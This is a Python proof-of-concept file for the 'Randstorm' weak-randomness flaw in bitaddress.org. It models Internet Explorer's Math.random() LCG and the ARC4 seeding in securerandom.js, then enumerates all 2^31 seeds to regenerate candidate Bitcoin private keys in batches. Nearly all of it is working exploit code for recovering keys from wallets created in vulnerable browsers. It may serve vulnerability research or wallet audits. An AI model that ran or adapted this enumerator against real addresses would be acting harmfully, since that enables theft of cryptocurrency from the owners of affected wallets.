"""
bitaddress.org Randstorm vulnerability - private key enumerator

Reproduction logic:
  When browser lacks window.crypto.getRandomValues (IE<11, Safari<6, etc.),
  SecureRandom's 256-byte ARC4 pool is entirely filled by Math.random().
  Math.random() in IE/old Safari is a 32-bit LCG, effective entropy only 31-32 bits.

  Full path (securerandom.js):
    1. pool[256] init: while(pptr < 256) { t = floor(65536 * Math.random()); pool[pptr++] = t>>8; pool[pptr++] = t&0xFF }
    2. pptr = floor(256 * Math.random())  // only affects subsequent seedInt8 write offset
    3. seedTime(): Date.getTime() split into 4 bytes XOR'd into pool (predictable/enumerable)
    4. entropyStr: browser fingerprint SHA256 XOR'd into pool (deterministic for same device)
    5. getByte(): first call initializes ARC4 with pool, then outputs ARC4 stream
    6. nextBytes(32): produces 32-byte private key, mod(n-1)+1

  Attack model (this POC v1, most conservative):
    Ignore seedTime and entropyStr mixing (assume they are known/enumerable for specific target),
    directly enumerate 2^31 initial states of IE LCG. Each seed deterministically produces one private key.
    Real attacks can combine timestamp windows to further narrow search space.

Source reference:
  targets/bitaddress/src/securerandom.js (lines 131-150, 55-67, 97-121)
  targets/bitaddress/src/biginteger.js (rng.nextBytes)
  Unciphered "Randstorm" disclosure (2023)
"""
import sys
import os
import struct
from typing import Iterator, Optional, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
from base import PocGenerator


# === IE JScript Math.random() LCG model ===
# IE 6-10 uses a linear congruential PRNG:
#   state = (state * 214013 + 2531011) & 0x7FFFFFFF
#   output = ((state >> 16) & 0x7FFF) / 32768.0
# Effective state space: 2^31 (but seed source usually only ~2^32 timestamps)

class IEMathRandom:
    """Faithful port of IE JScript's Math.random() - 32-bit LCG"""
    def __init__(self, seed: int):
        self.state = seed & 0x7FFFFFFF

    def next_float(self) -> float:
        self.state = (self.state * 214013 + 2531011) & 0x7FFFFFFF
        return ((self.state >> 16) & 0x7FFF) / 32768.0


# === ARC4 (RC4) stream cipher - line-by-line match with securerandom.js ===

class ARC4:
    """securerandom.js lines 90-124"""
    def __init__(self, key: list):
        self.S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + self.S[i] + key[i % len(key)]) & 255
            self.S[i], self.S[j] = self.S[j], self.S[i]
        self.i = 0
        self.j = 0

    def next_byte(self) -> int:
        self.i = (self.i + 1) & 255
        self.j = (self.j + self.S[self.i]) & 255
        self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]
        return self.S[(self.S[self.i] + self.S[self.j]) & 255]


# === Private key generation - corresponds to bitcoinjs-lib ECDSA.getBigRandom(n) ===

SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


def generate_privkey_from_seed(seed: int) -> Optional[str]:
    """
    Given IE Math.random()'s LCG initial state,
    reproduce bitaddress.org's complete private key generation path.
    """
    rng = IEMathRandom(seed)

    # securerandom.js lines 144-148: fill 256-byte pool
    pool = []
    for _ in range(128):
        t = int(65536 * rng.next_float())
        pool.append((t >> 8) & 0xFF)
        pool.append(t & 0xFF)

    # securerandom.js line 149: pptr = Math.floor(poolSize * Math.random())
    # This value only affects subsequent seedInt8 write position, not ARC4 init
    # because getByte() initializes ARC4 with the entire pool on first call

    # securerandom.js lines 56-59: ARC4 initialization
    arc4 = ARC4(pool)

    # Generate 32-byte private key (biginteger.js line 601: rng.nextBytes)
    privkey_bytes = bytes([arc4.next_byte() for _ in range(32)])

    # ECDSA.getBigRandom(n): mod(n-1) + 1
    privkey_int = int.from_bytes(privkey_bytes, 'big')
    privkey_int = (privkey_int % (SECP256K1_N - 1)) + 1

    return privkey_int.to_bytes(32, 'big').hex()


# === POC Generator ===

TOTAL_SPACE = 2**31  # IE LCG state space


class RandstormIEGenerator(PocGenerator):
    """
    Enumerate 2^31 possible initial states of IE Math.random() LCG,
    each deterministically producing one secp256k1 private key (hex).

    Effective entropy: 31 bit (IE JScript LCG state)
    Risk level: critical (<=40 bit)
    """

    @property
    def poc_id(self) -> str:
        return "randstorm_ie"

    @property
    def poc_name(self) -> str:
        return "bitaddress.org Randstorm (IE LCG 32-bit)"

    @property
    def total_space(self) -> int:
        return TOTAL_SPACE

    @property
    def batch_size(self) -> int:
        return 10000

    def generate(self, start_index: int) -> Iterator[Tuple[int, Optional[str]]]:
        for seed in range(start_index, TOTAL_SPACE):
            privkey_hex = generate_privkey_from_seed(seed)
            yield (seed, privkey_hex)
